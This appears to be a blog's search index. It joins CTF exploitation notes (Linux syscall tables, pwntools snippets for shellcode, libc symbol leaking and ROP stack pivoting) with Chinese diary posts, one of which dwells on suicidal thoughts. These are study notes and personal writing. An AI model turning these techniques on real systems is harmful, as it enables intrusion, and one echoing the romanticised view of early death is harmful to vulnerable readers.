__NR_getgid 47#define __NR_signal 48#define __NR_geteuid 49#define __NR_getegid 50#define __NR_acct 51#define __NR_umount2 52#define __NR_lock 53#define __NR_ioctl 54#define __NR_fcntl 55#define __NR_mpx 56#define __NR_setpgid 57#define __NR_ulimit 58#define __NR_oldolduname 59#define __NR_umask 60#define __NR_chroot 61#define __NR_ustat 62#define __NR_dup2 63#define __NR_getppid 64#define __NR_getpgrp 65#define __NR_setsid 66#define __NR_sigaction 67#define __NR_sgetmask 68#define __NR_ssetmask 69#define __NR_setreuid 70#define __NR_setregid 71#define __NR_sigsuspend 72#define __NR_sigpending 73#define __NR_sethostname 74#define __NR_setrlimit 75#define __NR_getrlimit 76#define __NR_getrusage 77#define __NR_gettimeofday 78#define __NR_settimeofday 79#define __NR_getgroups 80#define __NR_setgroups 81#define __NR_select 82#define __NR_symlink 83#define __NR_oldlstat 84#define __NR_readlink 85#define __NR_uselib 86#define __NR_swapon 87#define __NR_reboot 88#define __NR_readdir 89#define __NR_mmap 90#define __NR_munmap 91#define __NR_truncate 92#define __NR_ftruncate 93#define __NR_fchmod 94#define __NR_fchown 95#define __NR_getpriority 96#define __NR_setpriority 97#define __NR_profil 98#define __NR_statfs 99#define __NR_fstatfs 100#define __NR_ioperm 101#define __NR_socketcall 102#define __NR_syslog 103#define __NR_setitimer 104#define __NR_getitimer 105#define __NR_stat 106#define __NR_lstat 107#define __NR_fstat 108#define __NR_olduname 109#define __NR_iopl 110#define __NR_vhangup 111#define __NR_idle 112#define __NR_vm86old 113#define __NR_wait4 114#define __NR_swapoff 115#define __NR_sysinfo 116#define __NR_ipc 117#define __NR_fsync 118#define __NR_sigreturn 119#define __NR_clone 120#define __NR_setdomainname 121#define __NR_uname 122#define __NR_modify_ldt 123#define __NR_adjtimex 124#define __NR_mprotect 125#define __NR_sigprocmask 126#define __NR_create_module 127#define __NR_init_module 128#define __NR_delete_module 129#define __NR_get_kernel_syms 130#define __NR_quotactl 131#define __NR_getpgid 132#define __NR_fchdir 133#define __NR_bdflush 134#define __NR_sysfs 135#define __NR_personality 136#define __NR_afs_syscall 137#define __NR_setfsuid 138#define __NR_setfsgid 139#define __NR__llseek 140#define __NR_getdents 141#define __NR__newselect 142#define __NR_flock 143#define __NR_msync 144#define __NR_readv 145#define __NR_writev 146#define __NR_getsid 147#define __NR_fdatasync 148#define __NR__sysctl 149#define __NR_mlock 150#define __NR_munlock 151#define __NR_mlockall 152#define __NR_munlockall 153#define __NR_sched_setparam 154#define __NR_sched_getparam 155#define __NR_sched_setscheduler 156#define __NR_sched_getscheduler 157#define __NR_sched_yield 158#define __NR_sched_get_priority_max 159#define __NR_sched_get_priority_min 160#define __NR_sched_rr_get_interval 161#define __NR_nanosleep 162#define __NR_mremap 163#define __NR_setresuid 164#define __NR_getresuid 165#define __NR_vm86 166#define __NR_query_module 167#define __NR_poll 168#define __NR_nfsservctl 169#define __NR_setresgid 170#define __NR_getresgid 171#define __NR_prctl 172#define __NR_rt_sigreturn 173#define __NR_rt_sigaction 174#define __NR_rt_sigprocmask 175#define __NR_rt_sigpending 176#define __NR_rt_sigtimedwait 177#define __NR_rt_sigqueueinfo 178#define __NR_rt_sigsuspend 179#define __NR_pread64 180#define __NR_pwrite64 181#define __NR_chown 182#define __NR_getcwd 183#define __NR_capget 184#define __NR_capset 185#define __NR_sigaltstack 186#define __NR_sendfile 187#define __NR_getpmsg 188#define __NR_putpmsg 189#define __NR_vfork 190#define __NR_ugetrlimit 191#define __NR_mmap2 192#define __NR_truncate64 193#define __NR_ftruncate64 194#define __NR_stat64 195#define __NR_lstat64 196#define __NR_fstat64 197#define __NR_lchown32 198#define __NR_getuid32 199#define __NR_getgid32 200#define __NR_geteuid32 201#define __NR_getegid32 202#define __NR_setreuid32 203#define __NR_setregid32 204#define __NR_getgroups32 205#define __NR_setgroups32 206#define __NR_fchown32 207#define __NR_setresuid32 208#define __NR_getresuid32 209#define __NR_setresgid32 210#define __NR_getresgid32 211#define __NR_chown32 212#define __NR_setuid32 213#define __NR_setgid32 214#define __NR_setfsuid32 215#define __NR_setfsgid32 216#define __NR_pivot_root 217#define __NR_mincore 218#define __NR_madvise 219#define __NR_getdents64 220#define __NR_fcntl64 221#define __NR_gettid 224#define __NR_readahead 225#define __NR_setxattr 226#define __NR_lsetxattr 227#define __NR_fsetxattr 228#define __NR_getxattr 229#define __NR_lgetxattr 230#define __NR_fgetxattr 231#define __NR_listxattr 232#define __NR_llistxattr 233#define __NR_flistxattr 234#define __NR_removexattr 235#define __NR_lremovexattr 236#define __NR_fremovexattr 237#define __NR_tkill 238#define __NR_sendfile64 239#define __NR_futex 240#define __NR_sched_setaffinity 241#define __NR_sched_getaffinity 242#define __NR_set_thread_area 243#define __NR_get_thread_area 244#define __NR_io_setup 245#define __NR_io_destroy 246#define __NR_io_getevents 247#define __NR_io_submit 248#define __NR_io_cancel 249#define __NR_fadvise64 250#define __NR_exit_group 252#define __NR_lookup_dcookie 253#define __NR_epoll_create 254#define __NR_epoll_ctl 255#define __NR_epoll_wait 256#define __NR_remap_file_pages 257#define __NR_set_tid_address 258#define __NR_timer_create 259#define __NR_timer_settime 260#define __NR_timer_gettime 261#define __NR_timer_getoverrun 262#define __NR_timer_delete 263#define __NR_clock_settime 264#define __NR_clock_gettime 265#define __NR_clock_getres 266#define __NR_clock_nanosleep 267#define __NR_statfs64 268#define __NR_fstatfs64 269#define __NR_tgkill 270#define __NR_utimes 271#define __NR_fadvise64_64 272#define __NR_vserver 273#define __NR_mbind 274#define __NR_get_mempolicy 275#define __NR_set_mempolicy 276#define __NR_mq_open 277#define __NR_mq_unlink 278#define __NR_mq_timedsend 279#define __NR_mq_timedreceive 280#define __NR_mq_notify 281#define __NR_mq_getsetattr 282#define __NR_kexec_load 283#define __NR_waitid 284#define __NR_add_key 286#define __NR_request_key 287#define __NR_keyctl 288#define __NR_ioprio_set 289#define __NR_ioprio_get 290#define __NR_inotify_init 291#define __NR_inotify_add_watch 292#define __NR_inotify_rm_watch 293#define __NR_migrate_pages 294#define __NR_openat 295#define __NR_mkdirat 296#define __NR_mknodat 297#define __NR_fchownat 298#define __NR_futimesat 299#define __NR_fstatat64 300#define __NR_unlinkat 301#define __NR_renameat 302#define __NR_linkat 303#define __NR_symlinkat 304#define __NR_readlinkat 305#define __NR_fchmodat 306#define __NR_faccessat 307#define __NR_pselect6 308#define __NR_ppoll 309#define __NR_unshare 310#define __NR_set_robust_list 311#define __NR_get_robust_list 312#define __NR_splice 313#define __NR_sync_file_range 314#define __NR_tee 315#define __NR_vmsplice 316#define __NR_move_pages 317#define __NR_getcpu 318#define __NR_epoll_pwait 319#define __NR_utimensat 320#define __NR_signalfd 321#define __NR_timerfd_create 322#define __NR_eventfd 323#define __NR_fallocate 324#define __NR_timerfd_settime 325#define __NR_timerfd_gettime 326#define __NR_signalfd4 327#define __NR_eventfd2 328#define __NR_epoll_create1 329#define __NR_dup3 330#define __NR_pipe2 331#define __NR_inotify_init1 332#define __NR_preadv 333#define __NR_pwritev 334#define __NR_rt_tgsigqueueinfo 335#define __NR_perf_event_open 336#define __NR_recvmmsg 337#define __NR_fanotify_init 338#define __NR_fanotify_mark 339#define __NR_prlimit64 340#define __NR_name_to_handle_at 341#define __NR_open_by_handle_at 342#define __NR_clock_adjtime 343#define __NR_syncfs 344#define __NR_sendmmsg 345#define __NR_setns 346#define __NR_process_vm_readv 347#define __NR_process_vm_writev 348#define __NR_kcmp 349#define __NR_finit_module 350#define __NR_sched_setattr 351#define __NR_sched_getattr 352#define __NR_renameat2 353#define __NR_seccomp 354#define __NR_getrandom 355#define __NR_memfd_create 356#define __NR_bpf 357#define __NR_execveat 358#define __NR_socket 359#define __NR_socketpair 360#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364#define __NR_getsockopt 365#define __NR_setsockopt 366#define __NR_getsockname 367#define __NR_getpeername 368#define __NR_sendto 369#define __NR_sendmsg 370#define __NR_recvfrom 371#define __NR_recvmsg 372#define __NR_shutdown 373#define __NR_userfaultfd 374#define __NR_membarrier 375#define __NR_mlock2 376#define __NR_copy_file_range 377#define __NR_preadv2 378#define __NR_pwritev2 379#endif /* _ASM_X86_UNISTD_32_H */ 2）64bit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337rdi, rsi, rdx, rcx, r8, r9。（stack）#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0#define __NR_write 1#define __NR_open 2#define __NR_close 3#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7#define __NR_lseek 8#define __NR_mmap 9#define __NR_mprotect 10#define __NR_munmap 11#define __NR_brk 12#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15#define __NR_ioctl 16#define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32#define __NR_dup2 33#define __NR_pause 34#define __NR_nanosleep 35#define __NR_getitimer 36#define __NR_alarm 37#define __NR_setitimer 38#define __NR_getpid 39#define __NR_sendfile 40#define __NR_socket 41#define __NR_connect 42#define __NR_accept 43#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46#define __NR_recvmsg 47#define __NR_shutdown 48#define __NR_bind 49#define __NR_listen 50#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59#define __NR_exit 60#define __NR_wait4 61#define __NR_kill 62#define __NR_uname 63#define __NR_semget 64#define __NR_semop 65#define __NR_semctl 66#define __NR_shmdt 67#define __NR_msgget 68#define __NR_msgsnd 69#define __NR_msgrcv 70#define __NR_msgctl 71#define __NR_fcntl 72#define __NR_flock 73#define __NR_fsync 74#define __NR_fdatasync 75#define __NR_truncate 76#define __NR_ftruncate 77#define __NR_getdents 78#define __NR_getcwd 79#define __NR_chdir 80#define __NR_fchdir 81#define __NR_rename 82#define __NR_mkdir 83#define __NR_rmdir 84#define __NR_creat 85#define __NR_link 86#define __NR_unlink 87#define __NR_symlink 88#define __NR_readlink 89#define __NR_chmod 90#define __NR_fchmod 91#define __NR_chown 92#define __NR_fchown 93#define __NR_lchown 94#define __NR_umask 95#define __NR_gettimeofday 96#define __NR_getrlimit 97#define __NR_getrusage 98#define __NR_sysinfo 99#define __NR_times 100#define __NR_ptrace 101#define __NR_getuid 102#define __NR_syslog 103#define __NR_getgid 104#define __NR_setuid 105#define __NR_setgid 106#define __NR_geteuid 107#define __NR_getegid 108#define __NR_setpgid 109#define __NR_getppid 110#define __NR_getpgrp 111#define __NR_setsid 112#define __NR_setreuid 113#define __NR_setregid 114#define __NR_getgroups 115#define __NR_setgroups 116#define __NR_setresuid 117#define __NR_getresuid 118#define __NR_setresgid 119#define __NR_getresgid 120#define __NR_getpgid 121#define __NR_setfsuid 122#define __NR_setfsgid 123#define __NR_getsid 124#define __NR_capget 125#define __NR_capset 126#define __NR_rt_sigpending 127#define __NR_rt_sigtimedwait 128#define __NR_rt_sigqueueinfo 129#define __NR_rt_sigsuspend 130#define __NR_sigaltstack 131#define __NR_utime 132#define __NR_mknod 133#define __NR_uselib 134#define __NR_personality 135#define __NR_ustat 136#define __NR_statfs 137#define __NR_fstatfs 138#define __NR_sysfs 139#define __NR_getpriority 140#define __NR_setpriority 141#define __NR_sched_setparam 142#define __NR_sched_getparam 143#define __NR_sched_setscheduler 144#define __NR_sched_getscheduler 145#define __NR_sched_get_priority_max 146#define __NR_sched_get_priority_min 147#define __NR_sched_rr_get_interval 148#define __NR_mlock 149#define __NR_munlock 150#define __NR_mlockall 151#define __NR_munlockall 152#define __NR_vhangup 153#define __NR_modify_ldt 154#define __NR_pivot_root 155#define __NR__sysctl 156#define __NR_prctl 157#define __NR_arch_prctl 158#define __NR_adjtimex 159#define __NR_setrlimit 160#define __NR_chroot 161#define __NR_sync 162#define __NR_acct 163#define __NR_settimeofday 164#define __NR_mount 165#define __NR_umount2 166#define __NR_swapon 167#define __NR_swapoff 168#define __NR_reboot 169#define __NR_sethostname 170#define __NR_setdomainname 171#define __NR_iopl 172#define __NR_ioperm 173#define __NR_create_module 174#define __NR_init_module 175#define __NR_delete_module 176#define __NR_get_kernel_syms 177#define __NR_query_module 178#define __NR_quotactl 179#define __NR_nfsservctl 180#define __NR_getpmsg 181#define __NR_putpmsg 182#define __NR_afs_syscall 183#define __NR_tuxcall 184#define __NR_security 185#define __NR_gettid 186#define __NR_readahead 187#define __NR_setxattr 188#define __NR_lsetxattr 189#define __NR_fsetxattr 190#define __NR_getxattr 191#define __NR_lgetxattr 192#define __NR_fgetxattr 193#define __NR_listxattr 194#define __NR_llistxattr 195#define __NR_flistxattr 196#define __NR_removexattr 197#define __NR_lremovexattr 198#define __NR_fremovexattr 199#define __NR_tkill 200#define __NR_time 201#define __NR_futex 202#define __NR_sched_setaffinity 203#define __NR_sched_getaffinity 204#define __NR_set_thread_area 205#define __NR_io_setup 206#define __NR_io_destroy 207#define __NR_io_getevents 208#define __NR_io_submit 209#define __NR_io_cancel 210#define __NR_get_thread_area 211#define __NR_lookup_dcookie 212#define __NR_epoll_create 213#define __NR_epoll_ctl_old 214#define __NR_epoll_wait_old 215#define __NR_remap_file_pages 216#define __NR_getdents64 217#define __NR_set_tid_address 218#define __NR_restart_syscall 219#define __NR_semtimedop 220#define __NR_fadvise64 221#define __NR_timer_create 222#define __NR_timer_settime 223#define __NR_timer_gettime 224#define __NR_timer_getoverrun 225#define __NR_timer_delete 226#define __NR_clock_settime 227#define __NR_clock_gettime 228#define __NR_clock_getres 229#define __NR_clock_nanosleep 230#define __NR_exit_group 231#define __NR_epoll_wait 232#define __NR_epoll_ctl 233#define __NR_tgkill 234#define __NR_utimes 235#define __NR_vserver 236#define __NR_mbind 237#define __NR_set_mempolicy 238#define __NR_get_mempolicy 239#define __NR_mq_open 240#define __NR_mq_unlink 241#define __NR_mq_timedsend 242#define __NR_mq_timedreceive 243#define __NR_mq_notify 244#define __NR_mq_getsetattr 245#define __NR_kexec_load 246#define __NR_waitid 247#define __NR_add_key 248#define __NR_request_key 249#define __NR_keyctl 250#define __NR_ioprio_set 251#define __NR_ioprio_get 252#define __NR_inotify_init 253#define __NR_inotify_add_watch 254#define __NR_inotify_rm_watch 255#define __NR_migrate_pages 256#define __NR_openat 257#define __NR_mkdirat 258#define __NR_mknodat 259#define __NR_fchownat 260#define __NR_futimesat 261#define __NR_newfstatat 262#define __NR_unlinkat 263#define __NR_renameat 264#define __NR_linkat 265#define __NR_symlinkat 266#define __NR_readlinkat 267#define __NR_fchmodat 268#define __NR_faccessat 269#define __NR_pselect6 270#define __NR_ppoll 271#define __NR_unshare 272#define __NR_set_robust_list 273#define __NR_get_robust_list 274#define __NR_splice 275#define __NR_tee 276#define __NR_sync_file_range 277#define __NR_vmsplice 278#define __NR_move_pages 279#define __NR_utimensat 280#define __NR_epoll_pwait 281#define __NR_signalfd 282#define __NR_timerfd_create 283#define __NR_eventfd 284#define __NR_fallocate 285#define __NR_timerfd_settime 286#define __NR_timerfd_gettime 287#define __NR_accept4 288#define __NR_signalfd4 289#define __NR_eventfd2 290#define __NR_epoll_create1 291#define __NR_dup3 292#define __NR_pipe2 293#define __NR_inotify_init1 294#define __NR_preadv 295#define __NR_pwritev 296#define __NR_rt_tgsigqueueinfo 297#define __NR_perf_event_open 298#define __NR_recvmmsg 299#define __NR_fanotify_init 300#define __NR_fanotify_mark 301#define __NR_prlimit64 302#define __NR_name_to_handle_at 303#define __NR_open_by_handle_at 304#define __NR_clock_adjtime 305#define __NR_syncfs 306#define __NR_sendmmsg 307#define __NR_setns 308#define __NR_getcpu 309#define __NR_process_vm_readv 310#define __NR_process_vm_writev 311#define __NR_kcmp 312#define __NR_finit_module 313#define __NR_sched_setattr 314#define __NR_sched_getattr 315#define __NR_renameat2 316#define __NR_seccomp 317#define __NR_getrandom 318#define __NR_memfd_create 319#define __NR_kexec_file_load 320#define __NR_bpf 321#define __NR_execveat 322#define __NR_userfaultfd 323#define __NR_membarrier 324#define __NR_mlock2 325#define __NR_copy_file_range 326#define __NR_preadv2 327#define __NR_pwritev2 328#endif /* _ASM_X86_UNISTD_64_H */ 5）tools1）seccomp-toolshttps://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】 2）scyllahidehttps://github.com/x64dbg/ScyllaHide 3）ollydumphttps://www.52pojie.cn/thread-785387-1-1.html elf 4）文件dump内存信息。https://blog.csdn.net/qq_36119192/article/details/96474833 ![image-20210530174645013](/Users/rin/Library/Application Support/typora-user-images/image-20210530174645013.png) unicorn engine 5）capstonehttps://github.com/aquynh/capstone 6）qemu_stastic_x64https://github.com/multiarch/qemu-user-static 7）angrhttps://github.com/angr 6）pwntools组件1）pwntools指定glibc版本获取不同版本glibchttps://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/ pwntools加载。 123456from pwn import *context.log_level=&quot;debug&quot;sh = process([&quot;./lib00/lib/x86_64-linux-gnu/ld-2.31.so&quot;, &quot;./hello&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./lib00/lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)pwnlib.gdb.attach(sh)sh.interactive() 2）基本模块1）asm/shellcraft 汇编与反汇编，支持x86/x64/arm/mips/power pc等基本上所有的主流平台 12asm(shellcraft.sh())shellcraft.amd64.sh() 2）dynelf1234567891011#example:def leak(): payload = p64(addr) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;) 3）gdb : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT 5）memleak: 用于内存泄漏 5）rop【https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】 1234567In [59]: rop.rop.base rop.elfs rop.leave rop.resolverop.build rop.find_gadget rop.migrate rop.searchrop.call rop.find_stack_adjustment rop.migrated rop.search_iterrop.chain rop.from_blob rop.pivots rop.setRegistersrop.describe rop.gadgets rop.raw rop.unresolverop.dump rop.generatePadding rop.regs rop = ROP（&#39;main&#39;) ROP([ELF(&#39;./main&#39;)])创建rop对象 rop.raw:添加数据 1rop.raw(b&quot;a&quot;*10) rop.dump会将已经构建的栈数据输出,而且方便阅读 rop.call 12345678910rop.call(&#x27;read&#x27;,[1,2,3])print rop.dump()0x0000: &#x27;aaaa&#x27; &#x27;aaaaaaaaaa&#x27;0x0004: &#x27;aaaa&#x27;0x0008: &#x27;aaaa&#x27;0x000c: 0x80483a0 read(1, 2, 3)0x0010: &#x27;eaaa&#x27; &lt;return address&gt;0x0014: 0x1 arg00x0018: 0x2 arg10x001c: 0x3 arg2 第一个参数为目标函数符号名,第二个参数是个list,作为目标函数的参数.然后构建出数据拼接到已有的数据中或者使用rop.read(1,2,3):效果和call一样.细心点可以发现前一个read后的返回地址改成了栈调整的数据.rop模块会自动寻找gadget来连接上2次功能调用 rop.migrate括号直接接地址。 具体操作 12345#rop.migrate(2)#print rop.dump()0x0034: 0x804861b pop ebp; ret0x0038: -0x20x003c: 0x8048458 leave; ret 相当于自动化地实现了栈迁移。（pwntools yyds） rop.chain返回当前所有rop chain的shellcode值。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"1","slug":"note_深夜高速-1","date":"1919-08-09T15:34:14.000Z","updated":"2022-04-13T03:30:34.142Z","comments":true,"path":"1919/08/10/note_深夜高速-1/","link":"","permalink":"https://fuurinko.github.io/1919/08/10/note_%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F-1/","excerpt":"","text":"​ 0:​ 写下这些话的时候，不知不觉地，已经半夜两点了。 ​ 其实放在半个月之前的我看来，两点根本不是半夜，而是夜生活的开始。然而仅仅十五天，我将作息强行向前延伸了两小时，所以对于现在的我来说，两点已经是高程度的熬夜了。 ​ 熬夜并不是一件坏事，至少我如今也这么认为——只要不是因为玩手机等无意义的事情而浪费生命。 ​ 最近的我一直在经受苦难，或者说，我一直认为我在经受别人未曾经受的苦难。这份苦难深沉而难以被他人理解，这份苦难是独属于我的宝藏。 ​ 我珍视这样的宝藏——我将它视若使我独立于其他人的，高傲的资本，即使它本质上只是一种普通的苦难。我似乎沉醉于享受苦难了。享受苦难，多么滑稽，但是这是确乎发生的事情。 ​ 古往今来，享受苦难的人从来不会获得胜利，英雄从来视苦难为眼前的敌人，即使苦难要伴随他多年，但他必然不会爱上苦难。 ​ 正确的思维不会将痛苦的过程当做自我价值的完成，只有虚荣的心才会如此感想。 ​ 既然人没有真正喜爱的东西，那只有被人喜爱，才能使他满足，因此人生快意的来源，统统来自他人的赞赏，一旦赞赏减少，甚至消失，他也就消失了，于是他开始自我陶醉，但是又有什么能够陶醉呢？明明一事无成？ ​ 一事无成？并不全对，他还有一大把苦难，值得他去品味。 ​ 这样的个体，完全由虚荣构成，任何表现出来的，他所喜爱的事情，只不过是让社会接纳他的借口。 ​ 当我意识到这一点时，自然而然地会辩解：“那么，是不是所有人其实都没有真正喜欢的事情呢？” ​ 曾经我是坚信这一点的，但是我没有领会其中的微妙。 ​ 我无意探讨人类科学或者社会准则，我只是想写下我的愚蠢。我以为大家都没有心之所向，殊不知我只是个思维简单的二极管。这件事并不是非黑即白的，我们可以拥有并不是真心喜欢的东西，但是其中“真心喜欢”有几分，“不真心喜欢”又有几分？ ​ 这是一个很难界定的问题。 1:​ 前些日子，感觉提不起劲头，直到听说对面寝室楼有姐姐跳楼，心情一下变得非常复杂。 ​ 之所以复杂，是因为那时，我第一次完整地理解了决定轻生的人的心情。 ​ 活着的盼头，很难找到，但很容易就消失得一干二净了。第一次有死亡的念头，虽然念头维持的时间确实是一瞬即逝的，但是情绪还是在一瞬间爆发了。 ​ 虽然现在已经暂时找到了努力的方向，但是曾经挂在我心里明晃晃的太阳遮了大半。 ​ 然后我尝试与他人交流，不断地在意别人对于这件事情的看法，几天下来，我对自己的评价是：“太脆弱。” ​ 这几天，最触动的话是 “这世界上大部分的人都在经受苦难，那么多人，都扛下去了，你凭什么不能”，来源于刘畅两年前的周三电台。张麻子也给我讲了学校一个朋友高中练习电吉他的事，说他每天晚上为了躲避家人，从两点练琴到四点，并且没有耳机，更没有音箱。 ​ 接着我又想到高中时那些搞基础学科竞赛的同学，诸如此类的例子太多了，难道我经受的痛苦就一定比他们更加深，更加难以摆脱吗。 ​ 我还是一个太过脆弱的人，我过度放大苦难，并将苦难视为伴随我身体生存的共生体，既然不能从胜利中获得满足，那就从失败中获得满足。 ​ 这是我人生十几年，从各种离奇的环境中，生长出的畸形的心理缓解措施，我现在知道，这样的心情都是被刻意勾画出来的，严重程度尚不至此。虽然此时此刻我的心情依旧是抑郁的，但是我应当劝说自己。 2:​ 聊完了我对于苦难的态度，再来聊聊苦难本身吧。 ​ 我觉得这些困难，并不来源于身体上的劳累——这些其实是最不值一提的，一般的人都不会在这一步上摔倒。 ​ 困难多来自于自我否定，与外界环境的压力。换句话说，更多的是走不出心理上的低谷。 ​ 这件事确实十分离奇，一不下心就会陷入无限的正反馈，要么成绩变差，然后不断被周围的人唾弃，然后成绩更差，或者成绩变好，为了维持住周围人的赞扬，于是更加努力。 ​ 为了打破这样的循环，破局之处在于正反馈形成的逻辑。成绩的好坏有时候并不是个体更够完全掌控的事情，而能控制的环节，是“我”对于他人看法的回应。我完全可以不在意他人的看法，毕竟不管我当前怎样，与最后结果判定时的成绩关系并不紧密。 ​ 但是这往往是比闭着眼睛努力更难的事。一直以来，总有人说，在面试，考试等场景下，心态会比实力更重要。虽然我并不完全认同，但是如果在这话前加一些前置条件，就说得通了，比如说“整个学习过程中的心态” ​ 从各种方面已经展示了我极为差劲的心理素质，怎么改善，我应该去好好思考。 3:​ 昨天看到了飞机失事的新闻，确实一晚上也没怎么睡好。 ​ 确实还是能感受到，与纯粹的生命的流逝相比，我的所有痛苦都已经不值一提了。因为这件事，我甚至完全不难过了，我需要知道，世界上正在经历远比我更加深重的苦难的人数不胜数，他们有的能掌管自己的未来，但是有的甚至都没有机会去思考未来的一切就已经灰飞烟灭。 ​ 相比之下我只是一只普通得不能再普通的蚂蚁，每天为自己歌功颂德，在辱骂自己中获得自我满足，又像坐井观天的青蛙，远不知世间的美好与困苦。 ​ 如果一定要发散联想的话，十九岁的葬礼其实是充满吸引力的。这个酷爱伤天感地的年龄，恨不得从世间一切罪孽中挖出与自己的那么一丝若有若无的微妙联系，每天因为一些正常人都一笑而过的小挫折而将死亡挂在嘴边，这样的死亡太屑了。死亡也是一件至高无上的事，像我这样的人，如果一味赴死，也只会玷污死亡纯洁的意义。是这样的，我还不配。反正人总是要死的，早死晚死确实意义不大，没有必要这样挂念着，害人害己。 ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/tags/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}]},{"title":"夏 其二","slug":"幻想曲-04-夏 其二","date":"1919-08-09T15:00:00.000Z","updated":"2022-06-08T17:38:41.060Z","comments":true,"path":"1919/08/10/幻想曲-04-夏 其二/","link":"","permalink":"https://fuurinko.github.io/1919/08/10/%E5%B9%BB%E6%83%B3%E6%9B%B2-04-%E5%A4%8F%20%E5%85%B6%E4%BA%8C/","excerpt":"","text":"​ ​ 近来确实是入夏了。 ​ 痕迹隐隐约约，但是还是能够感觉得到。坐在室内不开空调，感觉尚且是舒适的，但是一旦在夜里走上十来分钟，体感并没有热意，回过神来却已经汗流浃背。头发开始变得容易滋生出并不算好闻的油味，但是值得庆幸的是洗的衣服如果用洗衣机脱过水的话，一晚上就能干透了。 ​ 有时侯坐校车能路过图书馆边上荷花池。大概一两个月前这片并不算大的池塘还是一篇寂寥，现在已经听取蛙声一片了，隔着几十米就能听见青蛙（也许是癞蛤蟆）锣鼓喧天，荷花倒是没有见到，可能已经过季了。 ​ 但是莲花还是开着的，就在二教门口的迷你小池塘里，两朵粉色的莲花面对面，早上开着，到傍晚的时候花苞就闭上了。说来晚上六七点的时候天还亮堂堂的，根本感受不到夜晚的降临，这莲花的节律倒是比人准许多。 ​ 如果我猜得不假，再过十天，可能就要到热得人发慌的盛夏了。之前在备忘录中写过关于盛夏的感想，有机会可以搬到博客上来，但大体就是，夏日在文艺作品中被描述得过于梦幻而意义深远，这种美好与实际体验高温带来的烦闷产生了矛盾，导致我对于夏日的情感比任何一个季节都复杂。但是不得不强调的是，我看过的文艺作品一般着重于强调夏日美好的一面，而夏日也确实有其令人头疼的一面，所以理性分析过后，其实并不存在所谓的矛盾，然而在我的思维空间中，美好或神圣的事物，通常不应该拥有负面的组成部分，所以一个简单的问题通常能困扰我很久。不过在我心中神圣的东西几乎已经消失殆尽了，此时此刻我都无法回忆出某个确切的例子，我总觉得真正的美好大概是一个抽象的概念，只要是实体必然有其两面性。而所谓的美好品质通常是倾向性或者适用性的。针对目前的大多数社会群体，一个足够尊重他人与自己，体贴讲理的人确实能够获得绝大多数人的好感。很不巧，我并不是一个足够尊重他人与自己，体贴讲理的人。 ​ 我几乎不被任何老师喜欢，也不喜欢任何老师。今天之所以想写这些，理由也很莫名其妙，因为我知道大概过几个月我就会把理由忘记，留下来的只有今天写下的这些文字，所以我决定不写，就让理由消失吧。 ​ 简单分析一下，从小到大我最讨厌的老师通常都是英语老师，原因很简单，首先我不喜欢英语这门学科，其次教我英语的老师基本都是年轻的女老师，这些老师最典型的特征就是聒噪，并散发着浓郁的刻薄主妇气息。她们通常是结婚没有几年，有一两个处于学前状态孩子，当这些元素碰撞在一起，产生的结果就是，上课时，英语老师会先自豪地给我们这些早就过了儿童阶段的老人分享她的早教经验，并且宣传一通英语要练童子功。 ​ 我到现在还是觉得这是一件非常荒谬的事情。 ​ 这件事本身也许并不复杂，但是分析这背后的原因确实是很复杂的。到现在我依旧认为它荒谬，大概说明我到现在也无法认同这些老师的价值观，我从心底里并不认为这是一件值得骄傲的事情，我也许是轻视这件事的。之所以轻视，大概是我一直认为学这些东西的人一点也不酷，只有学理工，算特别复杂的式子，写特别炫酷的代码，才叫酷。然而直到前不久，我已经在脑海里将这个理念强行推翻了，所谓强行推翻，大概指我潜意识里并不认同，但是理智要求我这么做。 ​ 具体的过程这里并不是重点，重点在于曾经的我潜意识里看不起任何与我观念相悖的人，除非我自己意识到我的观念是错误的但是无法改正。 ​ 